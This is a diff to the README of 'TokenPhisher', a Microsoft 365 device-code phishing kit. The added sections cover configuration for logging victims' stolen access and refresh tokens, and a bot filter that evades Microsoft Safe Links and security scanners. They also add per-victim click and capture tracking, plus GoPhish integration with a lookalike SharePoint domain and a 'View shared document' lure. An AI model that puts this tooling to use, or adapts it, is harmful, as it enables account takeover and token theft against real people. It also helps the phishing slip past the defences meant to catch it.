@@ -125,17 +125,104 @@ npm run setup -- --config-only --from-config config.json
 | `geoipallowlist` | ISO country codes allowed to reach `/share` |
 | `validateTokens` | After capture, probe Graph API and try refresh exchange (default: `true`) |
 | `graphValidationScope` | Scope used when refreshing for Graph validation |
+| `printTokensOnCapture` | Log access/refresh/id tokens to console after capture (default: `true`) |
+| `visitLogFile` | TSV path for click/capture tracking (default: `visits.tsv`) |
+| `botguard.enabled` | Block bots/scanners on `/share` (default: `true`) |
+| `botguard.safelinksBlock` | Block Microsoft Safe Links detonation (default: `true`) |
+| `botguard.jsChallenge` | Require JS cookie challenge before lure (default: `false`) |
+| `botguard.blockedJa3` | Block TLS JA3 hashes (requires `X-JA3-Fingerprint` header from edge) |
+
+## Bot protection
+
+Ported from [BenevolentGinx2](https://github.com/patrick-projects/BenevolentGinx2). Applied to **`/share` only** — `/smoke-test` is never filtered.
+
+**Why you want this with GoPhish + M365:** Microsoft Safe Links detonates URLs at mail delivery from datacenter IPs. Without blocking, every sent email creates a fake `issued` row in `visits.tsv` and burns device codes before victims click.
+
+Default behavior (`botguard.enabled: true`, `safelinksBlock: true`, `jsChallenge: false`):
+
+- Hard-block Safe Links / EOP scanner IPs, UAs, and headers → redirect to `redirectUrl`
+- Block known scanner UAs (curl, python-requests, headless Chrome, etc.)
+- Block empty User-Agent or missing `Accept-Language` / `Accept`
+
+Optional **`jsChallenge: true`** — serve a short “Verifying your browser…” page that sets a cookie before showing the lure. Use if you still see scanner noise; adds one reload for real users.
+
+Blocked requests are logged:
+
+```
+Botguard block: microsoft safelinks scanner ip=40.94.x.x
+```
+
+## Tracking who clicked and who captured
+
+Each visit to `/share` gets a **unique device code** — victims do not share one code. You learn their Azure identity only **after** they sign in at `microsoft.com/devicelogin`.
+
+Every event is appended to **`visits.tsv`** (tab-separated):
+
+```
+timestamp    code       recipient           gophish_rid    ip           status     user              detail
+[10.06...]   ABCD1234   alice@gipi.com      abc123xyz      203.0.113.1  issued
+[10.06...]   ABCD1234   alice@gipi.com      abc123xyz      203.0.113.1  captured   alice@gipi.com
+[10.06...]   WXYZ5678   bob@gipi.com        def456uvw      198.51.100.2 issued
+[10.06...]   WXYZ5678   bob@gipi.com        def456uvw      198.51.100.2 expired                      device code timed out before login
+```
+
+**Query params:** `?r=` or `?email=` (target email from mail merge), `?rid=` (GoPhish recipient id), `?id=` (generic fallback).
+
+**Status values:** `issued` (opened lure), `captured` (submitted code + got tokens), `expired` (never finished), `login_failed` (Microsoft rejected login).
+
+Quick checks on the server:
+
+```bash
+# Everyone who completed login
+awk -F'\t' '$6=="captured" {print $3, $7}' visits.tsv
+
+# Opened but never finished
+awk -F'\t' '$6=="expired" || $6=="login_failed" {print $3, $6}' visits.tsv
+```
+
+### GoPhish setup
+
+Use GoPhish for **email delivery + click tracking**, TokenPhisher for **device-code capture**. Typical flow:
+
+1. **Landing page** in GoPhish → type **Redirect**, URL:
+   ```
+   https://gipi.sharepoint.com.documents.v06.zip/share?r={{.Email}}
+   ```
+2. **Email template** → link victims with GoPhish’s tracked URL:
+   ```html
+   <a href="{{.URL}}">View shared document</a>
+   ```
+3. Victim clicks → GoPhish logs the click → redirects to TokenPhisher with `?r=alice@gipi.com&rid=...` appended.
+
+TokenPhisher stores both **email** (`recipient`) and **GoPhish rid** (`gophish_rid`) in `visits.tsv`. Correlate with GoPhish campaign results using `rid`, or read email directly from the TSV.
+
+**Alternative (no GoPhish click proxy):** put TokenPhisher directly in the email — you lose GoPhish click events but still track by email:
+
+```html
+<a href="https://gipi.sharepoint.com.documents.v06.zip/share?r={{.Email}}">View shared document</a>
+```
+
+**What each tool tracks:**
+
+| Event | GoPhish | TokenPhisher (`visits.tsv`) |
+|-------|---------|------------------------------|
+| Email sent | yes | — |
+| Link clicked | yes (`rid`) | `issued` |
+| Opened lure / saw code | — | `issued` |
+| Completed Microsoft login | — | `captured` + email in `user` |
+
+If you send one bare `/share` URL with no query params, you only learn who **captured** (from the token), not who clicked and bounced.
 
 ## Post-capture validation
 
 When a victim completes device login, the console and `logfile.txt` show:
 
 ```
-Visit /share — issued device code ABCD1234
+Visit /share — code ABCD1234 recipient=alice@gipi.com ip=203.0.113.1
 Start polling token for code: ABCD1234
 Success, your Azure tokens for code ABCD1234 were saved to tokens.txt
-CAPTURE user=victim@gipi.com tenant=3fc8fb8d-... code=ABCD1234 name="Jane Doe"
-GRAPH OK — Jane Doe (victim@gipi.com)
+CAPTURE OK — user=alice@gipi.com tenant=3fc8fb8d-... code=ABCD1234 name="Jane Doe"
+GRAPH OK — Jane Doe (alice@gipi.com)
 ```
 
 If the access token cannot call Graph (common with minimal scopes), a refresh exchange is attempted:
